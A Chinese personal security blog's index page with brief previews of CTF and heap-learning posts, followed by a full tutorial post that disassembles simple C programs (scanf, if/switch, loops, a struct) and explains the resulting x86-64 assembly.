      </script></div></div><a class="button-hover more" href="/LawlietLW.github.io/2020/06/04/vmpwn-xue-xi/#more">阅读全文</a></div><div class="recent-post-item"><a class="post-title" href="/LawlietLW.github.io/2020/05/24/dasctf-wu-yue-sai-bjdctf/">DASCTF五月赛&amp;BJDCTF</a><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 更新于 2020-07-30</time><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/LawlietLW.github.io/categories/CTF/">CTF</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/LawlietLW.github.io/tags/PWN/">PWN</a></div></div><div class="post-content"><div class="main-content content"><p>菜鸡打比赛就是兴致满满打开网站—&gt;下载附件，拖入IDA—&gt;F5，眉头紧锁，冷静分析—&gt;关闭网站，打开游戏，ctf什么的见鬼去吧</p>
<p>这次安恒月赛和bjdctf3rd梦幻联动，本着凑热闹的心态去打了一波，总共八个pwn，做了四个。。。艹，太菜了，下面记录并复现一下这次的赛题</p></div></div><a class="button-hover more" href="/LawlietLW.github.io/2020/05/24/dasctf-wu-yue-sai-bjdctf/#more">阅读全文</a></div><div class="recent-post-item"><a class="post-title" href="/LawlietLW.github.io/2020/05/17/lu-you-qi-huan-jing-da-jian/">路由器环境搭建</a><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 更新于 2020-05-20</time><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/LawlietLW.github.io/categories/%E7%AE%97%E6%B3%95/">算法</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/LawlietLW.github.io/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">环境搭建</a></div></div><div class="post-content"><div class="main-content content"><p>​</p></div></div><a class="button-hover more" href="/LawlietLW.github.io/2020/05/17/lu-you-qi-huan-jing-da-jian/#more">阅读全文</a></div><div class="recent-post-item"><a class="post-title" href="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/">PWN学习记录</a><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 更新于 2020-04-10</time><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/LawlietLW.github.io/categories/CTF/">CTF</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/LawlietLW.github.io/tags/pwn/">pwn</a></div></div><div class="post-content"><div class="main-content content"><h2 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h2><p>考察点:unsortedbin attack,house of sprit,global_max_fast,fastbin attack</p></div></div><a class="button-hover more" href="/LawlietLW.github.io/2020/04/09/pwn-xue-xi-ji-lu/#more">阅读全文</a></div><div class="recent-post-item"><a class="post-title" href="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/">堆学习记录</a><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 更新于 2020-03-08</time><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/LawlietLW.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/">漏洞学习</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/LawlietLW.github.io/tags/%E5%A0%86%E6%BC%8F%E6%B4%9E/">堆漏洞</a></div></div><div class="post-content"><div class="main-content content"><p>大部分题目都选自HITCON Training</p>
<h2 id="UAF漏洞-use-after-free"><a href="#UAF漏洞-use-after-free" class="headerlink" title="UAF漏洞(use after free)"></a>UAF漏洞(use after free)</h2><p>顾名思义，UAF漏洞的意思就是在chunk被free之后依然能够使用，产生的原因在于使用过堆块之后没有及时将堆块的指针置null，导致下次申请内存的时候依然能狗使用该堆块</p></div></div><a class="button-hover more" href="/LawlietLW.github.io/2020/02/24/dui-xue-xi-ji-lu/#more">阅读全文</a></div><div class="recent-post-item"><a class="post-title" href="/LawlietLW.github.io/2020/02/15/mysql-de-yi-xie-yu-chu-li-yu-ju/">MySQL注入</a><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 更新于 2020-04-09</time><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/LawlietLW.github.io/categories/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/LawlietLW.github.io/tags/MySQL%E9%A2%84%E5%A4%84%E7%90%86/">MySQL预处理</a><span>&nbsp;|&nbsp;</span><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/LawlietLW.github.io/tags/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/">无列名注入</a><span>&nbsp;|&nbsp;</span><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/LawlietLW.github.io/tags/order-by%E7%9B%B2%E6%B3%A8/">order by盲注</a></div></div><div class="post-content"><div class="main-content content"><p>复习了一下SQL注入，发觉还很有一部分知识点没掌握，记录一下<br>以2019强网杯随便注为例，之前是用的更改列名和表名来做的，但相对于利用MySQL预处理语句来做要麻烦很多，先了解一下MySQL的预处理语句</p></div></div><a class="button-hover more" href="/LawlietLW.github.io/2020/02/15/mysql-de-yi-xie-yu-chu-li-yu-ju/#more">阅读全文</a></div><div class="recent-post-item"><a class="post-title" href="/LawlietLW.github.io/2020/02/10/c-yu-yan-zai-hui-bian-zhong-de-biao-xian-xing-shi/">动态规划的背包问题</a><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 更新于 2020-05-17</time><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/LawlietLW.github.io/categories/%E7%AE%97%E6%B3%95/">算法</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/LawlietLW.github.io/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/">动态规划</a><span>&nbsp;|&nbsp;</span><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/LawlietLW.github.io/tags/C/">C</a><span>&nbsp;|&nbsp;</span><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/LawlietLW.github.io/tags/%E8%83%8C%E5%8C%85%E9%97%AE%E9%A2%98/">背包问题</a></div></div><div class="post-content"><div class="main-content content"><p>​        在做某些代码量比较大且比较杂的题时深感代码审计的吃力，基础还是不够扎实，比如vmpwn，虚拟机实现的功能翻译出来的伪C代码看的确实费力，从汇编层分析可能会更为清晰，所以打算将C语言中的一些常用代码转换成汇编代码分析一下，巩固一下基础</p>
<h2 id="demo1"><a href="#demo1" class="headerlink" title="demo1"></a>demo1</h2><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">int</span> a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">;</span>
    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token operator">></span>b<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">switch</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">case</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token keyword">case</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token keyword">case</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token keyword">default</span><span class="token punctuation">:</span><span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>b<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>
            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>这个demo中有定义变量，函数调用，if判断，switch语句和for循环，看一看反汇编出来的main函数</p>
<pre class=" language-assembly"><code class="language-assembly">/*objdump --disassemble=main -M intel ./demo*/
401186:    55                       push   rbp
401187:    48 89 e5                 mov    rbp,rsp
40118a:    48 83 ec 20              sub    rsp,0x20
40118e:    64 48 8b 04 25 28 00     mov    rax,QWORD PTR fs:0x28
401195:    00 00 
401197:    48 89 45 f8              mov    QWORD PTR [rbp-0x8],rax
40119b:    31 c0                    xor    eax,eax
40119d:    48 8d 45 e8              lea    rax,[rbp-0x18]
4011a1:    48 89 c6                 mov    rsi,rax
4011a4:    bf 04 20 40 00           mov    edi,0x402004
4011a9:    b8 00 00 00 00           mov    eax,0x0
4011ae:    e8 bd fe ff ff           call   401070 <__isoc99_scanf@plt>
4011b3:    48 8d 45 ec              lea    rax,[rbp-0x14]
4011b7:    48 89 c6                 mov    rsi,rax
4011ba:    bf 04 20 40 00           mov    edi,0x402004
4011bf:    b8 00 00 00 00           mov    eax,0x0
4011c4:    e8 a7 fe ff ff           call   401070 <__isoc99_scanf@plt>
4011c9:    8b 55 e8                 mov    edx,DWORD PTR [rbp-0x18]
4011cc:    8b 45 ec                 mov    eax,DWORD PTR [rbp-0x14]
4011cf:    39 c2                    cmp    edx,eax
4011d1:    7e 4e                    jle    401221 <main+0x9b>
4011d3:    48 8d 45 f0              lea    rax,[rbp-0x10]
4011d7:    48 89 c6                 mov    rsi,rax
4011da:    bf 04 20 40 00           mov    edi,0x402004
4011df:    b8 00 00 00 00           mov    eax,0x0
4011e4:    e8 87 fe ff ff           call   401070 <__isoc99_scanf@plt>
4011e9:    8b 45 f0                 mov    eax,DWORD PTR [rbp-0x10]
4011ec:    83 f8 02                 cmp    eax,0x2
4011ef:    74 18                    je     401209 <main+0x83>
4011f1:    83 f8 03                 cmp    eax,0x3
4011f4:    74 1f                    je     401215 <main+0x8f>
4011f6:    83 f8 01                 cmp    eax,0x1
4011f9:    74 02                    je     4011fd <main+0x77>
4011fb:    eb 4d                    jmp    40124a <main+0xc4>
4011fd:    bf 31 00 00 00           mov    edi,0x31
401202:    e8 29 fe ff ff           call   401030 <putchar@plt>
401207:    eb 41                    jmp    40124a <main+0xc4>
401209:    bf 32 00 00 00           mov    edi,0x32
40120e:    e8 1d fe ff ff           call   401030 <putchar@plt>
401213:    eb 35                    jmp    40124a <main+0xc4>
401215:    bf 33 00 00 00           mov    edi,0x33
40121a:    e8 11 fe ff ff           call   401030 <putchar@plt>
40121f:    eb 29                    jmp    40124a <main+0xc4>
401221:    c7 45 f4 00 00 00 00     mov    DWORD PTR [rbp-0xc],0x0
401228:    eb 18                    jmp    401242 <main+0xbc>
40122a:    8b 45 f4                 mov    eax,DWORD PTR [rbp-0xc]
40122d:    89 c6                    mov    esi,eax
40122f:    bf 04 20 40 00           mov    edi,0x402004
401234:    b8 00 00 00 00           mov    eax,0x0
401239:    e8 12 fe ff ff           call   401050 <printf@plt>
40123e:    83 45 f4 01              add    DWORD PTR [rbp-0xc],0x1
401242:    8b 45 ec                 mov    eax,DWORD PTR [rbp-0x14]
401245:    39 45 f4                 cmp    DWORD PTR [rbp-0xc],eax
401248:    7e e0                    jle    40122a <main+0xa4>
40124a:    b8 00 00 00 00           mov    eax,0x0
40124f:    48 8b 4d f8              mov    rcx,QWORD PTR [rbp-0x8]
401253:    64 48 33 0c 25 28 00     xor    rcx,QWORD PTR fs:0x28
40125a:    00 00 
40125c:    74 05                    je     401263 <main+0xdd>
40125e:    e8 dd fd ff ff           call   401040 <__stack_chk_fail@plt>
401263:    c9                       leave  
401264:    c3                       ret</code></pre>
<p>我们按照c代码的顺序来看，首先是<strong>scanf(“%d”,&amp;a);scanf(“%d”,&amp;b);</strong>，对应的汇编代码为</p>
<pre class=" language-assembly"><code class="language-assembly">40119d:    48 8d 45 e8              lea    rax,[rbp-0x18]
4011a1:    48 89 c6                 mov    rsi,rax
4011a4:    bf 04 20 40 00           mov    edi,0x402004
4011a9:    b8 00 00 00 00           mov    eax,0x0
4011ae:    e8 bd fe ff ff           call   401070 <__isoc99_scanf@plt>
4011b3:    48 8d 45 ec              lea    rax,[rbp-0x14]
4011b7:    48 89 c6                 mov    rsi,rax
4011ba:    bf 04 20 40 00           mov    edi,0x402004
4011bf:    b8 00 00 00 00           mov    eax,0x0
4011c4:    e8 a7 fe ff ff           call   401070 <__isoc99_scanf@plt></code></pre>
<p>lea的作用是取地址，把$rbp-0x18存入rax中，这里就是变量<strong>a</strong>的地址，下一句就是传参了，64位程序传参顺序是rdi，rsi，rdx，scanf第一个参数是格式化字符串，<strong>mov    edi,0x402004</strong>这一句即是传参格式化字符串</p>
<p><img src="/LawlietLW.github.io/2020/02/10/c-yu-yan-zai-hui-bian-zhong-de-biao-xian-xing-shi/D:%5CHexo%5Csource_posts%5CC%E8%AF%AD%E8%A8%80%E5%9C%A8%E6%B1%87%E7%BC%96%E4%B8%AD%E7%9A%84%E8%A1%A8%E7%8E%B0%E5%BD%A2%E5%BC%8F%5C1.jpg" alt="1"></p>
<p>gdb调试可以确定</p>
<p>之后就是调用scanf函数了</p>
<p>再看到<strong>if(a&gt;b)</strong>这一句</p>
<pre class=" language-assembly"><code class="language-assembly">4011c9:    8b 55 e8                 mov    edx,DWORD PTR [rbp-0x18]
4011cc:    8b 45 ec                 mov    eax,DWORD PTR [rbp-0x14]
4011cf:    39 c2                    cmp    edx,eax
4011d1:    7e 4e                    jle    401221 <main+0x9b></code></pre>
<p>将a的值放入edx，将b的值放入eax，然后比较edx和eax，jle即jmp less equal,小于等于就跳转，这样就直接跳转到了else语句处，我们先看else的代码块</p>
<pre class=" language-assembly"><code class="language-assembly">else
    {
        for(int i=0;i<=b;i++)
            printf("%d",i);
    }</code></pre>
<p>对应的汇编语句如下</p>
<pre class=" language-assembly"><code class="language-assembly">401221:    c7 45 f4 00 00 00 00     mov    DWORD PTR [rbp-0xc],0x0
401228:    eb 18                    jmp    401242 <main+0xbc>
40122a:    8b 45 f4                 mov    eax,DWORD PTR [rbp-0xc]
40122d:    89 c6                    mov    esi,eax
40122f:    bf 04 20 40 00           mov    edi,0x402004
401234:    b8 00 00 00 00           mov    eax,0x0
401239:    e8 12 fe ff ff           call   401050 <printf@plt>
40123e:    83 45 f4 01              add    DWORD PTR [rbp-0xc],0x1
401242:    8b 45 ec                 mov    eax,DWORD PTR [rbp-0x14]
401245:    39 45 f4                 cmp    DWORD PTR [rbp-0xc],eax
401248:    7e e0                    jle    40122a <main+0xa4></code></pre>
<p>首先定义变量i=0，<strong>mov    DWORD PTR [rbp-0xc],0x0</strong>，然后和变量b进行比较，</p>
<pre class=" language-assembly"><code class="language-assembly">401228:    eb 18                    jmp    401242 <main+0xbc>
......
401242:    8b 45 ec                 mov    eax,DWORD PTR [rbp-0x14]
401245:    39 45 f4                 cmp    DWORD PTR [rbp-0xc],eax
401248:    7e e0                    jle    40122a <main+0xa4></code></pre>
<p>将b的值存入eax，然后与i相比较，i&lt;=b即跳转</p>
<pre class=" language-assembly"><code class="language-assembly">40122a:    8b 45 f4                 mov    eax,DWORD PTR [rbp-0xc]
40122d:    89 c6                    mov    esi,eax
40122f:    bf 04 20 40 00           mov    edi,0x402004
401234:    b8 00 00 00 00           mov    eax,0x0
401239:    e8 12 fe ff ff           call   401050 <printf@plt>
40123e:    83 45 f4 01              add    DWORD PTR [rbp-0xc],0x1</code></pre>
<p>这里就是调用printf函数，然后往下就有到了比较环节，循环</p>
<p>接下来我们再回过头看if语句的代码块</p>
<pre class=" language-assembly"><code class="language-assembly">4011d3:    48 8d 45 f0              lea    rax,[rbp-0x10]
4011d7:    48 89 c6                 mov    rsi,rax
4011da:    bf 04 20 40 00           mov    edi,0x402004
4011df:    b8 00 00 00 00           mov    eax,0x0
4011e4:    e8 87 fe ff ff           call   401070 <__isoc99_scanf@plt>
4011e9:    8b 45 f0                 mov    eax,DWORD PTR [rbp-0x10]
4011ec:    83 f8 02                 cmp    eax,0x2
4011ef:    74 18                    je     401209 <main+0x83>
4011f1:    83 f8 03                 cmp    eax,0x3
4011f4:    74 1f                    je     401215 <main+0x8f>
4011f6:    83 f8 01                 cmp    eax,0x1
4011f9:    74 02                    je     4011fd <main+0x77>
4011fb:    eb 4d                    jmp    40124a <main+0xc4>
4011fd:    bf 31 00 00 00           mov    edi,0x31
401202:    e8 29 fe ff ff           call   401030 <putchar@plt>
401207:    eb 41                    jmp    40124a <main+0xc4>
401209:    bf 32 00 00 00           mov    edi,0x32
40120e:    e8 1d fe ff ff           call   401030 <putchar@plt>
401213:    eb 35                    jmp    40124a <main+0xc4>
401215:    bf 33 00 00 00           mov    edi,0x33
40121a:    e8 11 fe ff ff           call   401030 <putchar@plt></code></pre>
<p>流程也是先定义变量c，然后调用scanf，然后将c的值存入eax，与1、2、3作比较，相等则跳转到对应的语句，其中<strong>break</strong>的汇编代码就是</p>
<p><strong>jmp    40124a &lt;main+0xc4&gt;</strong>，跳转到程序结尾</p>
<pre class=" language-assembly"><code class="language-assembly">40124a:    b8 00 00 00 00           mov    eax,0x0
40124f:    48 8b 4d f8              mov    rcx,QWORD PTR [rbp-0x8]
401253:    64 48 33 0c 25 28 00     xor    rcx,QWORD PTR fs:0x28
40125a:    00 00 
40125c:    74 05                    je     401263 <main+0xdd>
40125e:    e8 dd fd ff ff           call   401040 <__stack_chk_fail@plt>
401263:    c9                       leave  
401264:    c3                       ret</code></pre>
<p>这个简单的程序就差不多分析完了，这么分析下来汇编代码也并没有想象的那么难，都是有据可依的，比如调用函数先传参，if语句则是cmp之后跳转，switch语句也是多个比较和跳转语句，接下来我们看另一个小程序，结构体分析</p>
<h2 id="demo2"><a href="#demo2" class="headerlink" title="demo2"></a>demo2</h2><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token keyword">struct</span> person<span class="token punctuation">{</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>name<span class="token punctuation">;</span>
    <span class="token keyword">int</span> age<span class="token punctuation">;</span>
    <span class="token keyword">int</span> height<span class="token punctuation">;</span>
    <span class="token keyword">int</span> x<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">struct</span> person <span class="token operator">*</span>man<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    man<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">struct</span> person<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> person<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    man<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-></span>name<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    man<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-></span>age<span class="token operator">=</span><span class="token number">18</span><span class="token punctuation">;</span>
    man<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-></span>height<span class="token operator">=</span><span class="token number">180</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>
        man<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-></span>x<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>i<span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<pre class=" language-assembly"><code class="language-assembly">401156:    55                       push   rbp
401157:    48 89 e5                 mov    rbp,rsp
40115a:    53                       push   rbx
40115b:    48 83 ec 18              sub    rsp,0x18
40115f:    bf 38 00 00 00           mov    edi,0x38
401164:    e8 d7 fe ff ff           call   401040 <malloc@plt>
401169:    48 89 05 f0 2e 00 00     mov    QWORD PTR [rip+0x2ef0],rax        # 404060 <man>
401170:    48 8b 1d e9 2e 00 00     mov    rbx,QWORD PTR [rip+0x2ee9]        # 404060 <man>
401177:    bf 10 00 00 00           mov    edi,0x10
40117c:    e8 bf fe ff ff           call   401040 <malloc@plt>
401181:    48 89 03                 mov    QWORD PTR [rbx],rax
401184:    48 8b 05 d5 2e 00 00     mov    rax,QWORD PTR [rip+0x2ed5]        # 404060 <man>
40118b:    c7 40 08 12 00 00 00     mov    DWORD PTR [rax+0x8],0x12
401192:    48 8b 05 c7 2e 00 00     mov    rax,QWORD PTR [rip+0x2ec7]        # 404060 <man>
401199:    c7 40 0c b4 00 00 00     mov    DWORD PTR [rax+0xc],0xb4
4011a0:    c7 45 ec 00 00 00 00     mov    DWORD PTR [rbp-0x14],0x0
4011a7:    eb 1b                    jmp    4011c4 <main+0x6e>
4011a9:    48 8b 05 b0 2e 00 00     mov    rax,QWORD PTR [rip+0x2eb0]        # 404060 <man>
4011b0:    8b 55 ec                 mov    edx,DWORD PTR [rbp-0x14]
4011b3:    48 63 d2                 movsxd rdx,edx
4011b6:    48 8d 4a 04              lea    rcx,[rdx+0x4]
4011ba:    8b 55 ec                 mov    edx,DWORD PTR [rbp-0x14]
4011bd:    89 14 88                 mov    DWORD PTR [rax+rcx*4],edx
4011c0:    83 45 ec 01              add    DWORD PTR [rbp-0x14],0x1
4011c4:    83 7d ec 09              cmp    DWORD PTR [rbp-0x14],0x9
4011c8:    7e df                    jle    4011a9 <main+0x53>
4011ca:    b8 00 00 00 00           mov    eax,0x0
4011cf:    48 83 c4 18              add    rsp,0x18
4011d3:    5b                       pop    rbx
4011d4:    5d                       pop    rbp
4011d5:    c3                       ret    
</code></pre>
<p>C代码中定义了一个结构体，然后定义了五个结构体指针，我仅仅对一个结构体指针进行了初始化，更好的观察结构体在汇编代码中的实现</p>
<p>首先是给结构体分配内存</p>
<pre class=" language-c"><code class="language-c">man<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">struct</span> person<span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> person<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>这一句对应着的汇编代码如下</p>
<pre class=" language-assembly"><code class="language-assembly">40115f:    bf 38 00 00 00           mov    edi,0x38
401164:    e8 d7 fe ff ff           call   401040 <malloc@plt>
401169:    48 89 05 f0 2e 00 00     mov    QWORD PTR [rip+0x2ef0],rax </code></pre>
<p>malloc的参数为0x38，返回值是一个指针，汇编中结果一般放在eax寄存器中，所以这里malloc的返回值直接存入了eax，然后将rax的值存入<strong>$rip+0x2ef0</strong>指向的地址，这里是一个相对寻址，未初始化的全局变量是存储在bss段的。</p>
<p>再看到这三句代码</p>
<pre class=" language-c"><code class="language-c">man<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-></span>name<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
man<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-></span>age<span class="token operator">=</span><span class="token number">18</span><span class="token punctuation">;</span>
man<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-></span>height<span class="token operator">=</span><span class="token number">180</span><span class="token punctuation">;</span></code></pre>
<p>对应的汇编代码为</p>
<pre class=" language-assembly"><code class="language-assembly">401170:    48 8b 1d e9 2e 00 00     mov    rbx,QWORD PTR [rip+0x2ee9]        # 404060 <man>
401177:    bf 10 00 00 00           mov    edi,0x10
40117c:    e8 bf fe ff ff           call   401040 <malloc@plt>
401181:    48 89 03                 mov    QWORD PTR [rbx],rax
401184:    48 8b 05 d5 2e 00 00     mov    rax,QWORD PTR [rip+0x2ed5]        # 404060 <man>
40118b:    c7 40 08 12 00 00 00     mov    DWORD PTR [rax+0x8],0x12
401192:    48 8b 05 c7 2e 00 00     mov    rax,QWORD PTR [rip+0x2ec7]        # 404060 <man>
401199:    c7 40 0c b4 00 00 00     mov    DWORD PTR [rax+0xc],0xb4</code></pre>
<p>首先将man[0]的值(即malloc(0x38)的返回值)存入rbx，然后调用malloc，分配name指针，然后将指针存入man[0]的值指向的地址，实际上在堆区，然后再将man[0]的值存入rax，往*(man[0]+8)写入0x12，接着继续往</p>
<p>*(man[0]+0xc)写入0xb4</p>
<p>还剩下最后一段，给数组循环赋值</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>
        man<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-></span>x<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>i<span class="token punctuation">;</span></code></pre>
<pre class=" language-assembly"><code class="language-assembly">4011a0:    c7 45 ec 00 00 00 00     mov    DWORD PTR [rbp-0x14],0x0
4011a7:    eb 1b                    jmp    4011c4 <main+0x6e>
4011a9:    48 8b 05 b0 2e 00 00     mov    rax,QWORD PTR [rip+0x2eb0]        # 404060 <man>
4011b0:    8b 55 ec                 mov    edx,DWORD PTR [rbp-0x14]
4011b3:    48 63 d2                 movsxd rdx,edx
4011b6:    48 8d 4a 04              lea    rcx,[rdx+0x4]
4011ba:    8b 55 ec                 mov    edx,DWORD PTR [rbp-0x14]
4011bd:    89 14 88                 mov    DWORD PTR [rax+rcx*4],edx
4011c0:    83 45 ec 01              add    DWORD PTR [rbp-0x14],0x1
4011c4:    83 7d ec 09              cmp    DWORD PTR [rbp-0x14],0x9
4011c8:    7e df                    jle    4011a9 <main+0x53></code></pre>
<p>首先定义变量i，然后跳转，和9进行大小比较，如果小于等于9则跳转，然后将<em>man[0]存入rax，将i存入edx，下面的<strong>movsxd rdx,edx</strong>是将edx由32位扩展为64位，将高32位置为第31位(即edx的最高位)的值，扩展了位数，数值保持不变，接着将i+4存入rcx，将i存入edx，将edx的值传给\</em>(man[0])+$rcx<em>\</em>4,这样，一开始i=0，i+4=4,edx=0，即将0传入*(man[0])+4<em>4=\</em>(man[0])+0x10处，*(man[0])存入了name，*(man[0])+0x8存入了age，*(man[0])+0xc存入了hieght，所以x[0]正好是存放在*(man[0])+0x10地址处的，剩下的数存入的地址也是每次增加4字节，那么，整个结构体的大概结构图如下</p>
